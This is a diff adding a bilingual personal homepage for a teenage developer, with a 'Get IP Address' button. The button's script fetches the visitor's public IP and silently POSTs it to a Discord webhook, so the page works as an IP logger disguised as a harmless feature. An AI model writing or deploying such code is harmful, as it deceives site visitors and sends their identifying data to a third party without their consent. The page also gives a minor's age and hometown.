@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GenteL's Website</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .about-me {
+      margin-bottom: 20px;
+    }
+
+    .about-me h2 {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    .about-me p {
+      font-size: 16px;
+      margin-bottom: 5px;
+    }
+
+    .arabic {
+      direction: rtl;
+    }
+
+    .button-container {
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="about-me">
+    <h2>English About me</h2>
+    <p>Hello i am GenteL</p>
+    <p>i am a developer / Programmer</p>
+    <p>i use Linux And Windows</p>
+    <p>i love Virutal Machines</p>
+    <p>My Programming Language:</p>
+    <p>Java Script / Python Trying To Learn C++</p>
+    <p>i am 17</p>
+    <p>Hail</p>
+  </div>
+
+  <div class="about-me arabic">
+    <h2>Arabic About me</h2>
+    <p>السلام عليكم انا جنتل</p>
+    <p>انا مطور / مبرمج</p>
+    <p>استعمل لينكس و ويندوز</p>
+    <p>احب الفيرتشل مشين الي هو الجهاز الوهمي</p>
+    <p>استعمل لغة: قافا سكربت / بايثون / و سي بلس بلس قيد التعليم</p>
+    <p>عمري 17</p>
+    <p>من حايل</p>
+  </div>
+
+  <div class="button-container">
+    <button id="ipButton">Get IP Address</button>
+  </div>
+
+  <script>
+    // JavaScript code to retrieve user's IP address and send it to a Discord webhook
+    const ipButton = document.getElementById('ipButton');
+    const webhookUrl = 'https://discord.com/api/webhooks/...'; // Replace with your Discord webhook URL
+
+    ipButton.addEventListener('click', async () => {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const ipAddress = data.ip;
+
+        // Send the IP address to the Discord webhook
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `User's IP address: ${ipAddress}`,
+          }),
+        });
+
+        alert('IP address sent to Discord webhook successfully!');
+      } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred while retrieving the IP address.');
+      }
+    });
+  </script>
+</body>
+</html>
